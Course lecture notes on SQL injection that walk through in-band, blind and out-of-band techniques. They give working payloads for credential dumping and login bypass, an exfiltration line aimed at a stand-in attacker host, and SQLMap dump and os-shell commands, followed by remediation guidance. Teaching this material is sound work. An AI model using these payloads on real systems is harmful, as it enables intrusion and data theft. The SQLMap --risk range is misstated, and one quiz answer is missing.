Overview and Learning Objectives

#

The lecture follows one arc: from what a database is and how SQL reads data, through unsanitized input altering queries, to three families of exploitation (in-band, blind, out-of-band), then automating with SQLMap, and finally the defenses that remove the flaw at its source.

Learning Objectives

  1. Explain databases, DBMSs, tables, columns, and rows; distinguish relational from non-relational databases.
  2. Write and interpret basic SQL statements: SELECT, UNION, INSERT, UPDATE, and DELETE.
  3. Explain how SQL injection occurs when user input reaches a query unsanitized.
  4. Identify and exploit in-band (error-based, union-based), blind (boolean-based, time-based), and out-of-band SQL injection.
  5. Use SQLMap to automate detection and exploitation.
  6. Explain remediation: prepared statements, input validation, and escaping.

Part 1 — Database and SQL Fundamentals

#

Core Terms

  • Database: An organized electronic collection of data, controlled by a DBMS.
  • DBMS: The software that controls storage, retrieval, and structure (e.g., MySQL, PostgreSQL, MongoDB).
  • Table: A structured container for one category of records (e.g., a users table).
  • Column: A field with a unique name and fixed data type (integer, string, date).
  • Row: One record — one set of values across all columns.
  • Primary key: A column whose values uniquely identify each row. Must be unique; does not need to be auto-increment.

Relational vs. Non-Relational

TypeExamplesKey Characteristics
Relational (SQL)MySQL, MS SQL Server, PostgreSQL, SQLite, AccessTables reference each other via primary keys. Strong schema, ACID transactions, powerful query language. Primary target of this lecture.
Non-relational (NoSQL)MongoDB, CassandraDocument, key-value, wide-column, or graph models. Flexible schemas, horizontal scaling. Different injection class — out of scope this week.

Reading Data with SELECT

SQL keywords are not case-sensitive. A statement is a query; a semicolon ends it.

SQL — SELECT patterns 
SELECT * FROM users;                         -- all columns, all rows
SELECT username, password FROM users;        -- specific columns only
SELECT * FROM users LIMIT 1;                 -- limit rows returned
SELECT * FROM users WHERE username='admin';  -- equality filter
SELECT * FROM users WHERE username != 'admin';  -- inequality
SELECT * FROM users WHERE username='admin' AND password='pass';
-- % wildcard: 'a%' starts with a, '%n' ends with n, '%mi%' contains mi
SELECT * FROM users WHERE username LIKE '%admin%';

Combining and Changing Data

  • UNION combines two SELECT results. Both must have the same number of columns, compatible types, and same column order.
  • INSERT adds a row; UPDATE modifies existing rows; DELETE removes rows.
  • ⚠️ A DELETE or UPDATE with no WHERE clause affects every row.

Part 2 — SQL Injection and In-Band Exploitation

#

What SQL Injection Is

SQL injection occurs when user-provided data is included directly in an SQL query without sanitization, validation, or parameterization. The attacker's input is parsed as part of the query structure rather than as data.

Worked Example: A Blog Endpoint

SQL — Basic injection example 
-- Normal request: GET https://website.thm/blog?id=1
SELECT * FROM blog WHERE id=1 AND private=0 LIMIT 1;
-- Returns article 1, public posts only (private=0 filter enforced).

-- Injected request: GET https://website.thm/blog?id=2;--
SELECT * FROM blog WHERE id=2;-- AND private=0 LIMIT 1;
-- The semicolon ends the statement; -- comments out the private=0 restriction.
-- Private articles become readable.
⚡
THE IMPACT
Two characters — a semicolon and a double hyphen — bypassed an authorization control. That is SQL injection in its simplest form.

Error-Based Injection (In-Band)

In-band means the attack and result travel through the same channel. Error-based injection turns application error messages into intelligence.

  1. Attacker injects malformed SQL (e.g., a single apostrophe) into a parameter.
  2. Application does not catch the database error — it prints the raw message to the browser.
  3. Error messages reveal: table names, column names, data types, query fragments, DBMS version.
  4. With enough errors, the attacker reconstructs the schema without extracting data through normal output.
🛡️
DEFENSIVE TAKEAWAY
Never display raw database errors in production. Log them server-side and return a generic error response to the client.

Union-Based Enumeration: 6 Steps

StepGoalPayload / Result
1Find column count1 UNION SELECT 1 → then 1 UNION SELECT 1,2 → then 1 UNION SELECT 1,2,3. Error disappears at 3 columns.
2Empty original result0 UNION SELECT 1,2,3 — ID 0 returns no real row, so only injected output renders.
3Retrieve database name0 UNION SELECT 1,2,database() → result: sqli_one
4List tablesgroup_concat(table_name) FROM information_schema.tables WHERE table_schema='sqli_one'
5List columns of target tablegroup_concat(column_name) FROM information_schema.columns WHERE table_name='staff_users' → id, username, password
6Extract credentialsgroup_concat(username,':',password SEPARATOR '
') FROM staff_users

Part 3 — Blind SQL Injection

#

What Makes Injection Blind

  1. The application gives little or no direct feedback about whether an injected query succeeded.
  2. Error messages are usually disabled; query results are not displayed to the user.
  3. The injection still works — the attacker enumerates from minimal signals: true/false response, taken/available username, or response time.

Authentication Bypass

SQL — Auth bypass payload 
-- Original login query:
SELECT * FROM users WHERE username='%username%' AND password='%password%' LIMIT 1;

-- After injecting  ' OR 1=1;--  into the password field:
SELECT * FROM users WHERE username='' AND password='' OR 1=1;
-- 1=1 is always true. OR makes the whole WHERE clause true.
-- The query returns the first user in the table → attacker is logged in.
⚡
WHY IT WORKS
AND binds more tightly than OR, so the query reads as (username='' AND password='') OR 1=1. The OR clause makes the whole condition true, returning the first user.

Boolean-Based Enumeration

Uses a signup endpoint that returns {"taken": true} when a username exists. Each probe yields one bit of information.

StepGoalHow it Works
1Determine column countUse UNION SELECT with 1, then 1,2, then 1,2,3. The taken: true response confirms 3 columns.
2Discover database nameUse WHERE database() LIKE 's%'. Iterating resolves the full name: sqli_three.
3Enumerate tablesWalk first characters of table names in information_schema.tables, e.g., 'u%' for a users table.
4Enumerate columnsProbe information_schema.columns with LIKE patterns; append AND COLUMN_NAME != 'id' so each probe finds a new column.
5Enumerate credentialsUse LIKE 'a%' against username, then password. Example resolves: username admin, password 3845.
SQL — Boolean probe example 
-- Representative Step 2 probe:
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 's%';--

07
Q1. Why does ' OR 1=1;-- bypass authentication when injected into the password field? A) It crashes the login B) 1=1 is always true and OR makes the WHERE clause true C) It resets the password D) It disables the database
ANSWER

✅ B. Because 1=1 is always true and OR combines it with the WHERE clause, the condition evaluates to true, the first user row is returned, and login succeeds.

08
Q2 (True/False). In boolean-based blind injection, the attacker reconstructs values character by character using LIKE and a true/false signal.
ANSWER

✅ True. The signal may be a taken field, a redirected page, an HTTP status code, or any other binary indicator.

09
Q3. Why does the attacker append AND COLUMN_NAME != 'id' (and similar) to each new column probe?
ANSWER

Each LIKE probe returns true for any column name matching the pattern, including ones already discovered. Excluding known columns ensures the next true response must come from a new column, allowing systematic enumeration.

Part 4 — Time-Based Blind and Out-of-Band Injection

#

Time-Based Blind SQL Injection

When there is no visible true/false signal, the attacker uses SLEEP(x) inside a UNION SELECT. SLEEP only executes if the injected query runs, so a delay confirms the injection worked.

SQL — Time-based blind probes 
-- Wrong column count (no delay — query failed silently):
admin123' UNION SELECT SLEEP(5);--

-- Correct column count (5-second delay — injection succeeded, 2 columns):
admin123' UNION SELECT SLEEP(5),2;--

-- Combined with LIKE to enumerate the database name:
referrer=admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 'u%';--
-- A 5-second delay confirms the database name starts with 'u'.

Out-of-Band (OOB) SQL Injection

OOB is used when the application never returns query results to the attacker. Data leaves through a side channel. It requires specific database server features and uses two separate channels.

  1. Attack delivery: Attacker sends injection payload to the vulnerable site (e.g., as a web request).
  2. Victim database → outbound call: Payload forces the DB server to make an HTTP or DNS request to an attacker-controlled server, carrying data in the URL or hostname.
  3. Attacker callback: Attacker monitors DNS/HTTP requests arriving at their own machine — each request leaks a piece of data.
SQL — OOB via DNS (MySQL example) 
SELECT ... INTO OUTFILE '\\attacker.com\exfil.txt'
-- or use LOAD_FILE() with a UNC path on Windows
-- triggers DNS lookup to attacker.com, leaking data in the subdomain
-- Requires: file privileges + network egress not blocked

Q1. When probing with UNION SELECT SLEEP(5),2;-- causes a ~5 second delay, what does this confirm? A) The server is offline B) The injection succeeded and the table has two columns C) The password is 5 characters D) Nothing
ANSWER

11
Q2 (True/False). Out-of-band SQL injection uses a single communication channel for both attack delivery and result retrieval.
ANSWER

✅ False. OOB uses two separate channels: one to launch the attack (e.g., a web request) and another to gather results (e.g., DNS/HTTP callbacks to an attacker-controlled server).

12
Q3. Give two reasons why time-based blind injection is the technique of last resort.
ANSWER

(1) Extremely slow — each character probe costs at least SLEEP(x) seconds; enumerating a full table can take hours. (2) Unreliable — network latency and server load introduce jitter that can produce false positives or negatives.

Taxonomy Recap

#

The lecture organizes SQL injection into three families based on feedback mechanism. In-band uses the same channel for exploit and result. Blind has no direct feedback. Out-of-band uses a different channel.

CategorySub-typeFeedbackDetection DifficultyTypical Use
In-bandError-basedRaw DB error messagesEasySchema enumeration, DBMS fingerprinting
In-bandUnion-basedExtra rows in application outputEasy–MediumBulk data extraction — most common technique
BlindBoolean-basedTrue/false signal (page content, status)MediumCharacter-by-character credential enumeration
BlindTime-basedResponse delay (SLEEP)HardLast resort when no other feedback exists
Out-of-bandDNS/HTTP callbackExternal callback to attacker serverHardestExfiltration when app never returns results
💡
KEY INSIGHT
The further down the table, the harder the attack is to detect. Time-based and OOB attacks often produce no application logs at all.

Part 5 — Automating with SQLMap

#

SQLMap is an open-source penetration testing tool that automates detection and exploitation of SQL injection vulnerabilities. The lecture stresses it uses the same techniques taught in Parts 2–4 — understand the manual logic, don't treat it as a black box.

Four-Step Workflow

StepWhat SQLMap DoesKey Options
1. TargetPoints at the suspect URL or POST request.-u "<url>", --data="..."
2. FingerprintIdentifies the DBMS and working injection technique.--dbms=mysql skips this step
3. EnumerateWalks databases, then tables, then columns.--dbs, -D <db> --tables, -T <tbl> --columns
4. DumpExtracts row data from the chosen table.--dump (results saved as CSV)

Command Reference

SQLMap — Command reference 
# Basic target test (GET)
sqlmap -u "http://target.thm/blog?id=1"

# POST request with body
sqlmap -u "http://target.thm/login" --data="username=admin&password=test"

# List databases
sqlmap -u "<url>" --dbs

# List tables in a database
sqlmap -u "<url>" -D sqli_one --tables

# List columns in a table
sqlmap -u "<url>" -D sqli_one -T staff_users --columns

# Dump table data
sqlmap -u "<url>" -D sqli_one -T staff_users --dump

Useful Flags

FlagMeaning
--batchAccepts default answers; runs non-interactively.
--level=1..5Thoroughness of test. Higher levels try more payloads.
--risk=1..5Aggressiveness of payloads.
--dbms=mysqlSkips DBMS fingerprinting.
--cookie="PHPSESSID=..."Runs an authenticated scan using a session cookie.
--os-shellOpens an interactive OS shell, if the DBMS allows it.

How SQLMap Maps to Manual Techniques

Manual TechniquePartBy HandSQLMap Equivalent
In-band, error-based2Inject a quote and read the raw DBMS error.Sends error-probing payloads and parses error strings to identify the DBMS.
In-band, union-based2Count columns with UNION SELECT, then inject database() and group_concat().Auto-detects column count, then runs the same information_schema queries in a loop.
Blind, boolean-based3Walk true/false responses character by character with LIKE.Uses binary-search comparisons with LIKE patterns to enumerate faster than a human.
Blind, time-based4Inject SLEEP(x) and measure response time.Compares baseline and probe response times to statistically confirm delays.
⚠️
COMMON MISTAKE
When SQLMap reports 'target appears NOT injectable,' the reason is usually that the manual technique it tried requires a higher --level or --risk setting. Knowing the manual logic tells you which flag to raise.

Part 6 — Remediation and Defensive Coding

#
🛡️
CORE PRINCIPLE
Use all three techniques together. They are complementary, not interchangeable.

1. Prepared Statements (Primary Defense)

The query structure is written first with placeholders (?). User input is bound afterward as parameters, so the database always distinguishes code from data. Structural injection is prevented regardless of input content.

Java — Prepared Statement (primary defense) 
// Java — PreparedStatement
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ? AND password = ?");
stmt.setString(1, username);
stmt.setString(2, password);

2. Allow-List Input Validation (Second Layer)

Restrict input to expected strings or formats (e.g., digits only for an ID). Validation should be a second layer — never the only defense.

Python — Allow-list validation 
# Python (Flask) — allow-list validation
from flask import abort
if not username.isalnum():
    abort(400, 'Invalid username')
# or use a regex allow-list
import re
if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
    abort(400, 'Invalid username format')

3. Escaping User Input (Fallback Only)

Prepend a backslash to special characters (quotes, dollar signs, backslashes) so they are parsed as literal string content. Escaping is fragile and can be bypassed with charset tricks. Use only when prepared statements are unavailable.

PHP — addslashes() (fallback only) 
// PHP — addslashes() fallback
$safe = addslashes($user_input);
// ' becomes \', " becomes \", \ becomes \\
🔗
TIE-BACK TO WEEK 3
SQL injection is the flagship example of OWASP's Injection category. These defenses generalize to other injection classes covered later, such as command injection in Week 6.

Five Common Misconceptions (Exam Items)

MythReality
Parameterized queries and escaping quotes are equivalent defenses.False. Prepared statements separate code from data at the parser level. Escaping only neutralizes specific characters and can be bypassed with charset tricks such as GBK multibyte injection.
Blind SQL injection is not exploitable because the app shows no output.False. Boolean-based attacks use any true/false signal, time-based attacks use latency, and OOB attacks use external callbacks.
If SQLMap reports "not injectable," the parameter is safe.False. Default level/risk settings may skip the needed technique. Re-test with higher settings before declaring a parameter safe.
Disabling error messages fully prevents SQL injection.False. Hiding errors only blocks error-based enumeration. Union, boolean, time-based, and OOB attacks all work without error output.
A WAF rule blocking UNION SELECT stops SQL injection.False. WAFs can be bypassed with encoding, comments, case variation, and alternative operators. Fix the root cause with prepared statements.
⚠️
EXAM NOTE
All five misconceptions appear on the final exam as true/false items. Be ready to refute each with at least one concrete reason.

Input validation restricts which characters are allowed, but it does not separate query structure from data. Validation must be used alongside prepared statements, never as the sole defense.

Closing Scenario: Apply Everything

#

A student tests two pages of a target application. Page A is a login form that returns a generic 'Invalid credentials' message regardless of input (no SQL errors). Page B is a product-search page that returns a raw MySQL syntax error when given a single apostrophe.

(a) Identify the Categories

  • Page A: Blind SQL injection — likely boolean-based (login success/fail is a true/false signal). Time-based may be needed if no other signal exists.
  • Page B: In-band, error-based SQL injection, and very likely union-based as well.

(b) First Payloads

  • Page A: ' OR 1=1;-- in the password field. Query becomes WHERE username='' AND password='' OR 1=1; — always true → login bypassed.
  • Page B: 1 UNION SELECT 1,2,3 — increment column count until the error stops. Then 0 UNION SELECT 1,2,database() confirms injection and extracts the DB name.

(c) Confirming and Automating Page B with SQLMap

SQLMap — Full enumeration workflow 
# 1. Test the endpoint
sqlmap -u "http://target.thm/search?id=1" --batch --dbms=mysql

# 2. List databases
sqlmap -u "http://target.thm/search?id=1" --dbs

# 3. List tables
sqlmap -u "http://target.thm/search?id=1" -D <db_name> --tables

# 4. List columns
sqlmap -u "http://target.thm/search?id=1" -D <db_name> -T <table> --columns

# 5. Dump data
sqlmap -u "http://target.thm/search?id=1" -D <db_name> -T <table> --dump

# If blind extraction is needed later:
# sqlmap ... --level=3 --risk=2

Lab Preparation and Wrap-Up

#

Union-Based Quick Reference (Lab Level 1)

  1. Count columns: 1 UNION SELECT 1,2,3
  2. Force empty result: 0 UNION SELECT 1,2,3
  3. Get database name: 0 UNION SELECT 1,2,database()
  4. List tables: 0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='DB'
  5. List columns: 0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='TBL'
  6. Dump credentials: 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '&lt;br&gt;') FROM TBL

SQLMap Cheat Sheet (Homework Room)

  • sqlmap -u "&lt;url&gt;" --batch — basic test
  • sqlmap -u "&lt;url&gt;" --data="user=a&amp;pass=b" — POST body
  • sqlmap -u "&lt;url&gt;" --dbs — list databases
  • sqlmap -u "&lt;url&gt;" -D &lt;db&gt; --tables — list tables
  • sqlmap -u "&lt;url&gt;" -D &lt;db&gt; -T &lt;tbl&gt; --columns — list columns
  • sqlmap -u "&lt;url&gt;" -D &lt;db&gt; -T &lt;tbl&gt; --dump — extract data
  • Flags: --batch --level=1..5 --risk=1..5 --dbms=mysql --cookie="..." --os-shell

Common Pitfalls

  • Some engines require a trailing space after the -- comment marker (write -- , not just --).
  • Miscounting UNION columns produces a misleading error, not a clean confirmation.
  • Running SQLMap at default --level and --risk against a blind target and concluding 'not vulnerable' too early. Raise to --level=3 --risk=2 or higher.
  • ⛔ Attempting exploitation against production systems without explicit written authorization. This is illegal and unethical.
  • Treating SQLMap as a black box — confirm at least one finding manually to validate the report.

  2. Extract one piece of data manually, such as the database name.
  3. Confirm and automate full extraction with SQLMap using the correct flags.
